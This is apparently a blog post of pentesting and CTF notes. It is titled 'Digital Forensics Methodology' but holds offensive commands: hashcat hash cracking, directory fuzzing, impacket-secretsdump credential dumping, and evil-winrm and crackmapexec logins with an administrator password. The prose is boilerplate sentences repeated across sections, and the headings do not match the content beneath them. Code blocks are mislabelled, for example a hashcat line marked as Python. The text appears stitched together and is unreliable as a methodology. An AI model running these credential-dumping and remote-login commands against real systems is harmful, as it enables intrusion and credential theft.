---
TitleSEO: "Digital Forensics Methodology | ZureFX"
TitlePost: "Digital Forensics Methodology"
Author: "ZureFX"
Description: "Personal notes on Digital Forensics Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "lateral movement, blue team, persistence, networking"
URL: "https://zurefx.github.io/notes/note-digital-forensics-methodology-884.html"
URL_IMAGES: ""
Date: "2025-01-19"
Tags: "Lateral Movement, Blue Team, Persistence, Networking"
Section: "notes"
Lang: "en"
main_img: "note-digital-forensics-methodology-884"
Permalink: "/notes/note-digital-forensics-methodology-884.html"
BtnLabel: "Read Notes"
Pick: 0
---
## SeDebugPrivilege

### atexec

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.97.76.115/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.85.184.47/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services.

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

## bloodhound

### wpscan

- `dcomexec`
- `Pass the Ticket`
- `psexec`
- `Sudo Misconfiguration`
- `GetNPUsers`

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials.

## secretsdump

### Java

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.125.252.173
impacket-secretsdump administrator:'P@ssw0rd!'@10.121.79.97
```

Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.117.128.239/FUZZ
nmap -sCV -p995,1521,5986 10.43.16.220 -oN scan.txt
evil-winrm -i 10.40.90.143 -u administrator -p 'P@ssw0rd!'
```

The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
gobuster dir -u http://10.36.46.167/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.39.215.91 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```
